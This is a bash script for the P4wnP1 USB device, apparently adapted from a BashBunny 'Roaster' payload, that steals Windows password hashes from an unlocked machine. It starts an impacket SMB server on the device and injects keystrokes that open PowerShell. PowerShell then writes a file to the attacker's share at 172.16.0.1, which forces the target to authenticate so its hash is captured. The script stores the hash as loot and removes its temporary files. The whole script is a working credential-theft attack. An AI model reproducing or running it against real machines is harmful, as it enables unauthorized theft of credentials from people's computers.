#!/bin/bash

# Steal hash from a windows unlocked machine using smbserver.py 
# Based on golem445 BashBunny Roaster payload: https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/credentials/Roaster
# You need to setup P4wnP1 USB Gadget Settings as RNDIS_ETHERNET and HID keyboard
# Requirements 
# impacket: sudo apt-get install python-impacket or download and install from https://github.com/SecureAuthCorp/impacket
# smbserver.py from the impacket examples folder should be located in: "/usr/share/doc/python3-impacket/examples/smbserver.py"
# Copy this script to "/usr/local/P4wnP1/scripts/"
# Create a trigger to start the bash script "roaster.sh" when DHCP lease issued.


# Get target machine hostname
TARGET_HOSTNAME=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f4);

LOOTDIR=/usr/local/P4wnP1/www/loot/roaster/

# Make sure everything is clear before executing 

echo "[*] Killing smbserver..."
process=$(ps aux | grep 'smbserver' | grep -v 'grep')

# Check if the process was found
if [ ! -z "$process" ]; then
    # Extract the PID
    pid=$(echo $process | awk '{print $2}')

    # Kill the process
    kill $pid

    echo "Process 'smbserver' with PID $pid has been terminated."
else
    echo "No 'smbserver' process found."
fi

rm -rf /loot
rm /usr/local/P4wnP1/HIDScripts/roaster.js


# Check if smbserver.py is installed

if [ ! -f /usr/share/doc/python3-impacket/examples/smbserver.py ]; then
    echo "smbserver not found!"
    exit 1
  fi


# Create temp Loot directory

mkdir -p /loot/smb/

# Create Loot directory

mkdir -p $LOOTDIR
HOST=$TARGET_HOSTNAME
COUNT=$(ls -lad $LOOTDIR/$HOST* | wc -l)
COUNT=$((COUNT+1))
mkdir -p $LOOTDIR/$HOST-$COUNT

# Start web server
sleep 3

# Start smbserver.py
echo "Start smbserver.py"
python3 /usr/share/doc/python3-impacket/examples/smbserver.py s /loot/smb -smb2support > /loot/smb/hash.txt  &
sleep 3


# Create P4wnP1 HID script 
echo "layout(\"us\");" > /usr/local/P4wnP1/HIDScripts/roaster.js
echo "press(\"GUI r\");" >> /usr/local/P4wnP1/HIDScripts/roaster.js
echo "delay(500);" >> /usr/local/P4wnP1/HIDScripts/roaster.js
echo "type(\"powershell\")"  >> /usr/local/P4wnP1/HIDScripts/roaster.js
echo "delay(500);" >> /usr/local/P4wnP1/HIDScripts/roaster.js
echo "press(\"ENTER\");" >> /usr/local/P4wnP1/HIDScripts/roaster.js
echo "delay(500);" >> /usr/local/P4wnP1/HIDScripts/roaster.js
echo "typingSpeed(50,50);" >> /usr/local/P4wnP1/HIDScripts/roaster.js
echo 'type("New-Item -Path \\\\172.16.0.1\\s -ItemType \"file\" -Name \"EXFILTRATION_COMPLETE\" -Value \"EXFILTRATION_COMPLETE\"")' >> /usr/local/P4wnP1/HIDScripts/roaster.js
echo "delay(500);" >> /usr/local/P4wnP1/HIDScripts/roaster.js
echo "press(\"ENTER\");" >> /usr/local/P4wnP1/HIDScripts/roaster.js
echo "delay(1500);" >> /usr/local/P4wnP1/HIDScripts/roaster.js
echo "type(\"exit\")" >> /usr/local/P4wnP1/HIDScripts/roaster.js
echo "delay(1500);" >> /usr/local/P4wnP1/HIDScripts/roaster.js
echo "press(\"ENTER\");" >> /usr/local/P4wnP1/HIDScripts/roaster.js

# Execute P4wnP1 HID script 
P4wnP1_cli hid run -n roaster.js >/dev/null


# Wait for results
while ! [ -f /loot/smb/EXFILTRATION_COMPLETE ]; do sleep 1; done

# Delete temp files
rm /loot/smb/EXFILTRATION_COMPLETE

# Move temp files to loot folder
mv /loot/smb/hash.txt $LOOTDIR/$HOST-$COUNT

# Delete temp folder
rm -rf /loot

# Delete HID scrpt files
rm /usr/local/P4wnP1/HIDScripts/roaster.js

# Kill smbserver.py
echo "[*] Killing smbserver..."
process=$(ps aux | grep 'smbserver' | grep -v 'grep')

# Check if the process was found
if [ ! -z "$process" ]; then
    # Extract the PID
    pid=$(echo $process | awk '{print $2}')

    # Kill the process
    kill $pid

    echo "Process 'smbserver' with PID $pid has been terminated."
else
    echo "No 'smbserver' process found."
fi
P4wnP1_cli hid run -c 'press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);' >/dev/null
